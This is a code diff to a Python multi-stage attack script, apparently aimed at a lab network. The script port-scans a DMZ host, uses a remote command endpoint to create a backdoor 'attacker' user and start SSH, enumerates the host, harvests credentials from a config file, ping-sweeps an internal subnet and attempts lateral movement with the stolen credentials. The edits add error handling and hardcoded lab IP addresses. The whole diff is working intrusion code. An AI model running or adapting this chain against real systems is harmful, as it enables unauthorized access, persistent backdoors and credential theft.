@@ -6,7 +6,10 @@ import re
 import io
 import os
 import json
+import sys
 
+# sys.stdout = io.TextIOWrapper(sys.stdout.buffer, buffering=1)
+# sys.stderr = io.TextIOWrapper(sys.stderr.buffer, buffering=1)
 
 def port_scan(target, max_retries=3):
     nm = nmap.PortScanner()
@@ -42,12 +45,25 @@ def initial_exploit(target):
     
     # Create a backdoor user for SSH access
     payload = {"command": "useradd -m attacker && echo 'attacker:attackerpass' | chpasswd"}
-    response = requests.post(url, json=payload)
-    print("Backdoor user creation attempt:", response.text)
+    try:
+        response = requests.post(url, json=payload, timeout=10)
+        print(f"Backdoor user creation attempt status code: {response.status_code}")
+        print(f"Response content: {response.text}")
+        
+        if response.status_code != 200:
+            print(f"Unexpected status code: {response.status_code}")
+            return None, None
+    except requests.exceptions.RequestException as e:
+        print(f"Error during initial exploit: {e}")
+        return None, None
 
     # Ensure SSH is running
     payload = {"command": "service ssh start"}
-    requests.post(url, json=payload)
+    try:
+        response = requests.post(url, json=payload, timeout=10)
+        print(f"SSH start attempt status code: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error starting SSH: {e}")
 
     return "attacker", "attackerpass"
 
@@ -85,6 +101,28 @@ def enumerate_system(ssh):
     
     return system_info
 
+def scan_internal_network(ssh, network):
+    live_ips = []
+    for i in range(1, 20):
+        ip = f"{network}.{i}"
+        command = f"ping -c 1 -W 1 {ip} > /dev/null 2>&1 && echo '{ip} is up' || echo '{ip} is down'"
+        result = execute_ssh_command(ssh, command)
+        print(result)
+        if "is up" in result:
+            live_ips.append(ip)
+    return live_ips
+
+
+# def ping_sweep(ssh, network):
+#     live_ips = []
+#     for i in range(1, 255):
+#         ip = f"{network}.{i}"
+#         command = f"ping -c 1 -W 1 {ip} > /dev/null 2>&1 && echo '{ip} is up' || echo '{ip} is down'"
+#         result = execute_ssh_command(ssh, command)
+#         if "is up" in result:
+#             live_ips.append(ip)
+#     return live_ips
+
 def find_internal_networks(ssh):
     network_info = execute_ssh_command(ssh, "ip route || route -n")
     internal_networks = re.findall(r'\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)(?:\.[0-9]{1,3}){2}\b', network_info)
@@ -115,18 +153,18 @@ def search_for_credentials(ssh):
     print(config_content)
     return config_content
 
-def scan_internal_network(ssh, internal_network):
-    output = execute_ssh_command(ssh, f"nmap -sn {internal_network}")
-    print(f"Scan results for {internal_network}:")
-    print(output)
-    return output
+# def scan_internal_network(ssh, internal_network):
+#     output = execute_ssh_command(ssh, f"nmap -sn {internal_network}")
+#     print(f"Scan results for {internal_network}:")
+#     print(output)
+#     return output
 
 def attempt_lateral_movement(ssh, internal_target, config_content):
     # Parse the config file content
     config = dict(line.split('=') for line in config_content.splitlines() if '=' in line)
     username = config.get('internal_user')
     password = config.get('internal_password')
-    print(username, password)
+    # print(username, password)
     
     if not username or not password:
         print("Failed to extract credentials from config file")
@@ -145,7 +183,7 @@ def attempt_lateral_movement(ssh, internal_target, config_content):
         return False
 
 def multi_stage_attack():
-    dmz_target = "dmz_server"
+    dmz_target = "172.16.238.2"
     
     print("Stage 1: Port Scanning DMZ")
     open_ports = port_scan(dmz_target)
@@ -174,12 +212,17 @@ def multi_stage_attack():
     potential_creds = search_for_credentials(ssh)
     
     print("\nStage 7: Internal Network Scanning")
+    print (internal_networks)
     for network in internal_networks:
-        scan_internal_network(ssh, network)
+        if network.startswith('172.16.240'):  # Focus on the internal network
+            print(True)
+            live_ips = scan_internal_network(ssh, '172.16.240')
+            print(f"Live IPs in {network}/24: {live_ips}")
     
     print("\nStage 8: Attempting Lateral Movement")
-    # For simplicity, we'll try the first internal network found
-    internal_target = internal_networks[0].split('/')[0]  # Remove subnet mask if present
+    # For simplicity, we'll try the last internal network found
+    internal_target = live_ips[-1].split('/')[0]  # Remove subnet mask if present
+    print(internal_target)
     success = attempt_lateral_movement(ssh, internal_target, potential_creds)
     
     if success:
